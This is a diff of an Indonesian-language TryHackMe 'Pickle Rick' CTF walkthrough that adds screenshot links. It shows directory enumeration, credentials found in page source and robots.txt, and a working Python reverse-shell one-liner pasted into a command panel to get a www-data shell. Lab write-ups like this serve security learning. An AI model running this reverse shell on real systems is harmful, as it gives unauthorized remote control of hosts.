@@ -48,13 +48,21 @@ Nmap done: 1 IP address (1 host up) scanned in 40.35 seconds
 ## Gobuster
 - Baris perintah: `gobuster dir -u http://<IP Machine> -w <wordlists>`
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%201.JPG)
+
 ## Content Discovery
 - Buka halaman web `http://<IP_machine>` di browser
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%202.JPG)
+
 - Tekan **Ctrl+U** atau klik kanan pada halaman lalu pilih **View Page Source** untuk menampilkan source code halaman. Disini ditemukan informasi bahwa usernamenya adalah **R1ckRul3s**
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%203.JPG)
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%204.JPG)
 
 - Buka halaman `http://<IP_machine>/robots.txt` di tab baru. Disini ditemukan sebuah password
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%205.JPG)
 
 ```sh
 username: R1ckRul3s
@@ -64,24 +72,36 @@ password: Wubbalubbadubdub
 ## Gain Access
 - Lakukan login ke halaman `http://<IP_machine>/login.php` dengan username dan password yang ditemukan diatas
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%206.JPG)
+
 - Jika kita ketik `ls` lalu tekan Execute maka diperoleh daftar file sebagai berikut
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%207.JPG)
 
-- Jika kita ketik `cat Sup3rS3cretPick13Ingred.txt` lalu tekan Execute maka muncul pesan bahwa perintah tersebut telah di block 
+- Jika kita ketik `cat Sup3rS3cretPick13Ingred.txt` lalu tekan Execute maka muncul pesan bahwa perintah tersebut telah di block
 
-
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%208.JPG) 
 
 - Gunakan Payload berikut untuk masuk ke server. Ganti **10.8.142.62** dengan IP tun0 pada komputer yang anda gunakan
 ```sh
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.142.62",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
 ```
-- Buka terminal dan jalankan netcat dengan printah `nc -lnvp <port>` 
+
+- Buka terminal dan jalankan netcat dengan printah `nc -lnvp <port>`
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%209.JPG)
 
 - Copy payload dan paste ke halaman `http://<IP_machine>/portal.php` lalu tekan Execute
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%2010.JPG)
+
 - Netcat berhasil terkoneksi dan masuk sebagai user **www-data**
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%2011.JPG)
+
 - Disini kita bisa membaca file **Sup3rS3cretPick13Ingred.txt** dengan perintah `cat Sup3rS3cretPick13Ingred.txt` yang sebelumnya diblock
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%2012.JPG)
 
 - Di directory **/home** ditemukan home directory **rick**. Navigasi ke directory **/home/rick** dan disana ditemukan file **second ingredients**. Buka file tersebut dengan perintah `cat 'second ingredients'` 
 
